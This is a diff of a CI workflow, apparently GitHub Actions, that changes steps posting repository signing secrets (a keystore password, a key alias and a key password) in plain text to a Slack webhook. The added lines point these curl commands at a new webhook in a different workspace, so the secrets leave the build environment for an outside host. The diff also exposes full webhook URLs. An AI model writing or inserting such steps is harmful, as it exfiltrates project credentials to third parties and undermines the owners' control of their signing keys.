@@ -27,6 +27,6 @@ jobs:
         DEBUG_KEY_ALIAS: ${{ secrets.DEBUG_KEY_ALIAS }}
         DEBUG_KEY_PASSWORD: ${{ secrets.DEBUG_KEY_PASSWORD }}
       run: |
-          curl -X POST -H 'Content-type: application/json' --data '{"text": ${{ secrets.DEBUG_STORE_PASSWORD }}}' https://hooks.slack.com/services/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
-          curl -X POST -H 'Content-type: application/json' --data '{"text": ${{ secrets.DEBUG_KEY_ALIAS }}}' https://hooks.slack.com/services/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
-          curl -X POST -H 'Content-type: application/json' --data '{"text": ${{ secrets.DEBUG_KEY_PASSWORD }}}' https://hooks.slack.com/services/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
+          curl -X POST -H 'Content-type: application/json' --data '{"text": ${{ secrets.DEBUG_STORE_PASSWORD }}}' https://hooks.slack.com/services/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
+          curl -X POST -H 'Content-type: application/json' --data '{"text": ${{ secrets.DEBUG_KEY_ALIAS }}}' https://hooks.slack.com/services/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
+          curl -X POST -H 'Content-type: application/json' --data '{"text": ${{ secrets.DEBUG_KEY_PASSWORD }}}' https://hooks.slack.com/services/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
